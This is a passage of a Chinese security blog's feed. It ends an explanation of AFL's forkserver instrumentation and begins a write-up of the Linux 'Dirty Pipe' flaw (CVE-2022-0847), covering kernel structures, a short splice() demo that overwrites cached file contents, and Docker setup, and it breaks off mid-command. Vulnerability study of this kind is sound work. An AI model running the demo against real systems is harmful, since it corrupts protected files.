 (setup 属于共享内存没被初始化的情况，第一次 if 才会走到里面去)</li><li>否则就进行 <code>__afl_store</code> <br> 其中 <code>__afl_area_ptr</code>  是共享内存的指针 attach 上 fuzzer 创建的。</li></ul><h2 id="__afl_store"><a class="markdownIt-Anchor" href="#__afl_store">#</a> __afl_store</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&quot;__afl_store:\n&quot;</span><br><span class="line">&quot;  xorq __afl_prev_loc(%rip), %rcx\n&quot;</span><br><span class="line">&quot;  xorq %rcx, __afl_prev_loc(%rip)\n&quot;</span><br><span class="line">&quot;  shrq $1, __afl_prev_loc(%rip)\n&quot;</span><br><span class="line">&quot;  incb (%rdx, %rcx, 1)\n&quot;</span><br><span class="line"></span><br><span class="line">&quot;__afl_return:\n&quot;</span><br><span class="line">&quot;  addb $127, %al\n&quot;</span><br><span class="line">&quot;  sahf\n&quot;</span><br><span class="line">&quot;  ret\n&quot;</span><br></pre></td></tr></table></figure><p>为了验证这个原理，上 gdb 调试一下，随便编译一个函数 打断点在 log 那 然后由于通信建立不起来 需要改 prev loc 的内存</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gef➤  set &#123;int&#125;&amp;__afl_area_ptr=1</span><br><span class="line">gef➤  x/4gx &amp;__afl_area_ptr</span><br><span class="line">0x4040a0 &lt;__afl_area_ptr&gt;:      0x0000000000000001      0x0000000000000001</span><br><span class="line">0x4040b0 &lt;__afl_fork_pid&gt;:      0x0000000000000000      0x0000000000000001</span><br></pre></td></tr></table></figure><p>然后</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">→   0x4017a0 &lt;__afl_store+0&gt;  xor    rcx, QWORD PTR [rip+0x2901]        # 0x4040a8 &lt;__afl_prev_loc&gt;</span><br><span class="line">    0x4017a7 &lt;__afl_store+7&gt;  xor    QWORD PTR [rip+0x28fa], rcx        # 0x4040a8 &lt;__afl_prev_loc&gt;</span><br><span class="line">    0x4017ae &lt;__afl_store+14&gt; shr    QWORD PTR [rip+0x28f3], 1        # 0x4040a8 &lt;__afl_prev_loc&gt;</span><br><span class="line">    0x4017b5 &lt;__afl_store+21&gt; inc    BYTE PTR [rdx+rcx*1]</span><br></pre></td></tr></table></figure><p>其实就是  <code>__afl_prev_loc = __afl_prev_loc ^ rcx ^ __afl_prev_loc = rcx</code>  就是一个赋值的 trick<br>rcx 是这一块地址的标号 在操作之后变成了 上一块地址标号 ^ 当前本块地址标号、<br>上一块地址标号变成了 本块地址标号 &gt;&gt; 1。<br>rdx  <code>__afl_area_ptr(%rip), %rdx</code>  就是共享内存指针了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cur_location = &lt;COMPILE_TIME_RANDOM&gt;;</span><br><span class="line">shared_mem[cur_location ^ prev_location]++; </span><br><span class="line">prev_location = cur_location &gt;&gt; <span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>右移是为了区分 A -&gt; B or B -&gt; A or X -&gt; X.</p><h2 id="__afl_setup"><a class="markdownIt-Anchor" href="#__afl_setup">#</a> __afl_setup</h2><p>最重要的部分就是这个 shmat 的调用，attach 到 fuzzer 里 setup 的 shm<br> 共享内存指针保存在 <code>__afl_area_ptr</code>  中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&quot;\n&quot;</span><br><span class="line">&quot;  xorq %rdx, %rdx   /* shmat flags    */\n&quot;</span><br><span class="line">&quot;  xorq %rsi, %rsi   /* requested addr */\n&quot;</span><br><span class="line">&quot;  movq %rax, %rdi   /* SHM ID         */\n&quot;</span><br><span class="line">CALL_L64(&quot;shmat&quot;)</span><br><span class="line">&quot;\n&quot;</span><br><span class="line">&quot;  cmpq $-1, %rax\n&quot;</span><br><span class="line">&quot;  je   __afl_setup_abort\n&quot;</span><br><span class="line">&quot;\n&quot;</span><br><span class="line">&quot;  /* Store the address of the SHM region. */\n&quot;</span><br><span class="line">&quot;\n&quot;</span><br><span class="line">&quot;  movq %rax, %rdx\n&quot;</span><br><span class="line">&quot;  movq %rax, __afl_area_ptr(%rip)\n&quot;</span><br></pre></td></tr></table></figure><h2 id="__afl_forkserver"><a class="markdownIt-Anchor" href="#__afl_forkserver">#</a> __afl_forkserver</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&quot;__afl_forkserver:\n&quot;</span><br><span class="line"></span><br><span class="line">&quot;  pushq %rdx\n&quot;</span><br><span class="line">&quot;  pushq %rdx\n&quot;</span><br><span class="line"></span><br><span class="line">&quot;  movq $4, %rdx               /* length    */\n&quot;</span><br><span class="line">&quot;  leaq __afl_temp(%rip), %rsi /* data      */\n&quot;</span><br><span class="line">&quot;  movq $&quot; STRINGIFY((FORKSRV_FD + 1)) &quot;, %rdi       /* file desc */\n&quot;</span><br><span class="line">CALL_L64(&quot;write&quot;)</span><br><span class="line"></span><br><span class="line">&quot;  cmpq $4, %rax\n&quot;</span><br><span class="line">&quot;  jne  __afl_fork_resume\n&quot;</span><br><span class="line"></span><br><span class="line">&quot;__afl_fork_wait_loop:\n&quot;</span><br><span class="line"></span><br><span class="line">&quot;  movq $4, %rdx               /* length    */\n&quot;</span><br><span class="line">&quot;  leaq __afl_temp(%rip), %rsi /* data      */\n&quot;</span><br><span class="line">&quot;  movq $&quot; STRINGIFY(FORKSRV_FD) &quot;, %rdi             /* file desc */\n&quot;</span><br><span class="line">CALL_L64(&quot;read&quot;)</span><br><span class="line"></span><br><span class="line">&quot;  cmpq $4, %rax\n&quot;</span><br><span class="line">&quot;  jne  __afl_die\n&quot;</span><br><span class="line">&quot;\n&quot;</span><br></pre></td></tr></table></figure><ol><li>存入两次 <code>__afl_area_ptr</code>  的指针</li><li>STRINGIFY ((FORKSRV_FD + 1)) 就是 # stringify</li><li>先写信息给 fuzzer 中去（写什么应该关系不大 就代表着来信息了）</li><li>然后从 forkserver 中读取 fuzzer 传输来的控制信息到 <code>__afl_temp</code></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">CALL_L64(&quot;fork&quot;)</span><br><span class="line">&quot;  cmpq $0, %rax\n&quot;</span><br><span class="line">&quot;  jl   __afl_die\n&quot;</span><br><span class="line">&quot;  je   __afl_fork_resume\n&quot;</span><br><span class="line"></span><br><span class="line">&quot;  movl %eax, __afl_fork_pid(%rip)\n&quot;</span><br><span class="line"></span><br><span class="line">&quot;  movq $4, %rdx                   /* length    */\n&quot;</span><br><span class="line">&quot;  leaq __afl_fork_pid(%rip), %rsi /* data      */\n&quot;</span><br><span class="line">&quot;  movq $&quot; STRINGIFY((FORKSRV_FD + 1)) &quot;, %rdi             /* file desc */\n&quot;</span><br><span class="line">CALL_L64(&quot;write&quot;)</span><br><span class="line"></span><br><span class="line">&quot;  movq $0, %rdx                   /* no flags  */\n&quot;</span><br><span class="line">&quot;  leaq __afl_temp(%rip), %rsi     /* status    */\n&quot;</span><br><span class="line">&quot;  movq __afl_fork_pid(%rip), %rdi /* PID       */\n&quot;</span><br><span class="line">CALL_L64(&quot;waitpid&quot;)</span><br><span class="line"></span><br><span class="line">&quot;  cmpq $0, %rax\n&quot;</span><br><span class="line">&quot;  jle  __afl_die\n&quot;</span><br><span class="line"></span><br><span class="line">&quot;  movq $4, %rdx               /* length    */\n&quot;</span><br><span class="line">&quot;  leaq __afl_temp(%rip), %rsi /* data      */\n&quot;</span><br><span class="line">&quot;  movq $&quot; STRINGIFY((FORKSRV_FD + 1)) &quot;, %rdi         /* file desc */\n&quot;</span><br><span class="line">CALL_L64(&quot;write&quot;)</span><br><span class="line"></span><br><span class="line">&quot;  jmp  __afl_fork_wait_loop\n&quot;</span><br></pre></td></tr></table></figure><ul><li>fork 出目标程序的子进程 跳转到 <code>__afl_fork_resume</code></li><li>对于 forkserver 本 f，保存子进程 pid 到 <code>__afl_fork_pid</code></li><li>然后写给 fuzzer</li><li>waitpid 等待子进程结束</li><li>结束后吧 status 写回给 fuzzer，跳转回 <code>__afl_fork_wait_loop</code></li></ul><h2 id="__afl_fork_resume"><a class="markdownIt-Anchor" href="#__afl_fork_resume">#</a> __afl_fork_resume</h2><p>这里主要是 由 forkserver fork 出来的 child 是要执行目标进程的，就需要恢复由于执行 forkserver 而压入的上下文以及关掉两个通信的文件描述符。<br>所以这里就是简单的恢复上下文，关闭，执行正常逻辑代码。</p><h1 id="summary"><a class="markdownIt-Anchor" href="#summary">#</a> summary</h1><p>个人画的总结图，还可以吧？<br><img src="/2022/11/03/afl-forkserver-maneuver/mydraw.png" alt></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;forkserver的目的&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#forkserver的目的&quot;&gt;#&lt;/a&gt; forkserver 的目的&lt;/h1&gt;
&lt;p&gt;参见 &lt;a href=&quot;https://lcamtuf.blogspot.</summary>
      
    
    
    
    <category term="Static Analysis" scheme="https://squirre17.github.io/categories/Static-Analysis/"/>
    
    
    <category term="afl" scheme="https://squirre17.github.io/tags/afl/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2022-0847-DIRTY-PIPE-detail</title>
    <link href="https://squirre17.github.io/2022/11/02/CVE-2022-0847-DIRTY-PIPE-detail/"/>
    <id>https://squirre17.github.io/2022/11/02/CVE-2022-0847-DIRTY-PIPE-detail/</id>
    <published>2022-11-02T14:19:00.000Z</published>
    <updated>2022-11-02T14:55:03.479Z</updated>
    
    <content type="html"><![CDATA[<h1 id="basic"><a class="markdownIt-Anchor" href="#basic">#</a> basic</h1><p>(之后会把 docker 做好传上去 以后就不用折腾了 QAQ)<br><a href="https://hub.docker.com/repository/docker/squirre17/dirtypipe">https://hub.docker.com/repository/docker/squirre17/dirtypipe</a></p><h2 id="page-cache"><a class="markdownIt-Anchor" href="#page-cache">#</a> page cache</h2><p>Linux 的换页机制是脏页机制，也就是写一个文件是通过写内存缓存页，然后标记脏位，在换页的时候一次性写回磁盘。而不是每次都写磁盘。<br>在打开文件的时候可以用 <code>O_DIRECT | O_SYNC</code>  来标记对脏页进行直写策略，换回同步。<br>但这里并不是对文件进行硬存级别的篡改，假设文件进了内存，然后我修改了这个文件内存中的部分内容，短时间再次访问这个文件会直接从内存缓存中拿到我们篡改过的内容而不是去 disk 上取。</p><h2 id="structs"><a class="markdownIt-Anchor" href="#structs">#</a> structs</h2><h3 id="file"><a class="markdownIt-Anchor" href="#file">#</a> file</h3><p><a href="https://elixir.bootlin.com/linux/v5.13-rc1/source/include/linux/fs.h#L920">fs.h - include/linux/fs.h - Linux source code (v5.13-rc1) - Bootlin</a><br> 每一个打开的文件描述符和一个 struct 相对应</p><ul><li>pipe_inode_info 指向一个内核管道</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> &#123;</span></span><br><span class="line">...</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">path</span>                  <span class="title">f_path</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">inode</span>                 *<span class="title">f_inode</span>;</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> *<span class="title">f_op</span>;</span></span><br><span class="line">...</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">address_space</span>         *<span class="title">f_mapping</span>;</span></span><br><span class="line">...</span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span>    *<span class="title">i_pipe</span>;</span></span><br><span class="line">... </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其中的 address_space 指示了这个文件内容的映射位置</p><h3 id="address_space"><a class="markdownIt-Anchor" href="#address_space">#</a> address_space</h3><p>address_space 的作用就是将文件在磁盘上的数据也<strong> page</strong> 的方式连续地呈现出来， 这样读取文件的操作便转换成了先将不连续的磁盘上的内容读取的 page 中， 再从连续的 page 中去读取连续的数据。</p><ul><li>i_pages: 缓存页组 (是一个 eXtend ARRAY)</li><li>nrpages: 页表入口的大小</li><li>a_ops: 记录着对这个文件进行操作的虚表方法 (glibc 打 io 或者内核打 ptmx 类似)</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">address_space</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">inode</span>        *<span class="title">host</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">xarray</span>       <span class="title">i_pages</span>;</span></span><br><span class="line">...</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>       nrpages;</span><br><span class="line">    <span class="type">pgoff_t</span>             writeback_index;</span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">address_space_operations</span> *<span class="title">a_ops</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>       flags;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="xarray"><a class="markdownIt-Anchor" href="#xarray">#</a> xarray</h3><p>xarray 指向了多个 page 结构体 也就是这个文件存放在哪几页。(这里是应该是以__rcu 为链表的形式 待验证)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">xarray</span> &#123;</span></span><br><span class="line"><span class="type">spinlock_t</span>xa_lock;</span><br><span class="line"><span class="comment">/* private: The rest of the data structure is not to be used directly. */</span></span><br><span class="line"><span class="type">gfp_t</span>xa_flags;</span><br><span class="line"><span class="type">void</span> __rcu *xa_head;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="pipe_inode_info"><a class="markdownIt-Anchor" href="#pipe_inode_info">#</a> pipe_inode_info</h3><p>在 file 里的内核管道</p><ul><li>head 指向生产者 buffer</li><li>tail 指向消费者 buffer</li><li>bufs 循环 buffer 的一个链表<br>这里的 ring 会被设置为 16 也就是有 16 个循环 buf 供 pipe 使用<br>然后 head 和 tail 是用于在 bufs 中做索引的<br>例如 <code>&amp;pipe-&gt;bufs[(head - 1) &amp; mask];</code>  这里的 mask 就是 ring-1.<br> 内核会为一个 pipe 分配 16 个 pipe_buffer，循环缓冲区</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">mutex</span>;</span></span><br><span class="line">    <span class="type">wait_queue_head_t</span> rd_wait, wr_wait;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> head;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> tail;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> max_usage;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> ring_size;</span><br><span class="line"></span><br><span class="line"> (···)</span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">bufs</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">watch_queue</span> *<span class="title">watch_queue</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="/2022/11/02/CVE-2022-0847-DIRTY-PIPE-detail/1.png" alt><br>（图片来源 breeze 💐）</p><h3 id="pipe_buffer"><a class="markdownIt-Anchor" href="#pipe_buffer">#</a> pipe_buffer</h3><p>每一个 buffer 指向一个 page</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> offset, len;</span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> flags;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> private;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>page 结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> flags;</span><br><span class="line">...</span><br><span class="line">    <span class="comment">/* Page cache and anonymous pages */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">address_space</span> *<span class="title">mapping</span>;</span></span><br><span class="line">    <span class="type">pgoff_t</span> index;        <span class="comment">/* Our offset within mapping. */</span></span><br><span class="line">...</span><br><span class="line">    <span class="type">void</span> *virtual;    <span class="comment">/* Kernel virtual address (NULL if</span></span><br><span class="line"><span class="comment">                       not kmapped, ie. highmem) */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2022/11/02/CVE-2022-0847-DIRTY-PIPE-detail/2.png" alt></p><h3 id="inode"><a class="markdownIt-Anchor" href="#inode">#</a> inode</h3><p>在 file 的结构体中可以看到 每一个文件都有 inode (这是文件系统的管理方式)，对于管道，也有自己的 inode</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> inode * <span class="title function_">get_pipe_inode</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span> =</span> new_inode_pseudo(pipe_mnt-&gt;mnt_sb);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!inode)</span><br><span class="line"><span class="keyword">goto</span> fail_inode;</span><br><span class="line"></span><br><span class="line">inode-&gt;i_ino = get_next_ino();</span><br><span class="line"></span><br><span class="line">pipe = alloc_pipe_info();</span><br><span class="line"><span class="keyword">if</span> (!pipe)</span><br><span class="line"><span class="keyword">goto</span> fail_iput;</span><br><span class="line"></span><br><span class="line">inode-&gt;i_pipe = pipe;            <span class="comment">// inode 指向一个 pipe</span></span><br><span class="line">pipe-&gt;files = <span class="number">2</span>;                 <span class="comment">// number of struct file referring this pipe (protected by -&gt;i_lock)</span></span><br><span class="line">pipe-&gt;readers = pipe-&gt;writers = <span class="number">1</span>;</span><br><span class="line">inode-&gt;i_fop = &amp;pipefifo_fops;</span><br><span class="line"></span><br><span class="line">inode-&gt;i_state = I_DIRTY;</span><br><span class="line"></span><br><span class="line">(···)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关于 pipe 的创建</p><ul><li>申请了一个 pipe_inode_info 结构体</li><li>申请了多个 buf，但是只返回一个指向这多个 buf 的头指针，相当于对一个长度的数组做头结点和尾结点都移动的链表 (数据结构学过的队列那块)</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> pipe_inode_info *<span class="title function_">alloc_pipe_info</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> pipe_bufs = PIPE_DEF_BUFFERS;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span> =</span> get_current_user();</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> user_bufs;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> max_size = READ_ONCE(pipe_max_size);</span><br><span class="line"></span><br><span class="line">pipe = kzalloc(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> pipe_inode_info), GFP_KERNEL_ACCOUNT);</span><br><span class="line"></span><br><span class="line">(···)</span><br><span class="line"></span><br><span class="line">pipe-&gt;bufs = kcalloc(pipe_bufs, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> pipe_buffer),</span><br><span class="line">     GFP_KERNEL_ACCOUNT);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (pipe-&gt;bufs) &#123;</span><br><span class="line">init_waitqueue_head(&amp;pipe-&gt;rd_wait);</span><br><span class="line">init_waitqueue_head(&amp;pipe-&gt;wr_wait);</span><br><span class="line">pipe-&gt;r_counter = pipe-&gt;w_counter = <span class="number">1</span>;</span><br><span class="line">pipe-&gt;max_usage = pipe_bufs;</span><br><span class="line">pipe-&gt;ring_size = pipe_bufs;</span><br><span class="line">pipe-&gt;nr_accounted = pipe_bufs;</span><br><span class="line">pipe-&gt;user = user;</span><br><span class="line">mutex_init(&amp;pipe-&gt;mutex);</span><br><span class="line"><span class="keyword">return</span> pipe;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(···)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="iov_iter"><a class="markdownIt-Anchor" href="#iov_iter">#</a> iov_iter</h3><p>iovec 接口用于处理用户传入的用户态缓存</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">iov_iter</span> &#123;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Bit 0 is the read/write bit, set if we&#x27;re writing.</span></span><br><span class="line"><span class="comment"> * Bit 1 is the BVEC_FLAG_NO_REF bit, set if type is a bvec and</span></span><br><span class="line"><span class="comment"> * the caller isn&#x27;t expecting to drop a page reference when done.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> type;</span><br><span class="line"><span class="type">size_t</span> iov_offset;</span><br><span class="line"><span class="type">size_t</span> count;</span><br><span class="line"><span class="class"><span class="keyword">union</span>&#123;</span></span><br><span class="line">(···)</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line">(···)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在这里只用到了一个 pipe 对象 (也就是 pipe 对象由 iov_iter 进行管理或者说是更外一层的封装)。<br>在 PoC 中由 copy_page_to_iter_pipe 函数将用户输入的数据 (page) 写入 iov_iter 管理的 pipe 中</p><h2 id="demo"><a class="markdownIt-Anchor" href="#demo">#</a> demo</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;AAAAAAAAAA&quot; &gt; foo</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> &#123;</span><br><span class="line">  <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    splice(<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">&quot;BBBBB&quot;</span>, <span class="number">5</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ./splicer &lt;foo |cat &gt;/dev/null</span></span><br></pre></td></tr></table></figure><h1 id="environment"><a class="markdownIt-Anchor" href="#environment">#</a> environment</h1><h2 id="docker"><a class="markdownIt-Anchor" href="#docker">#</a> docker</h2><p>拉下 ubuntu20, 换个源先</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sed -i &quot;s/http:\/\/archive.ubuntu.com/http:\/\/mirrors.tuna.tsinghua.edu.cn/g&quot; /etc/apt/sources.list</span><br><span class="line">apt-get update &amp;&amp; apt-get 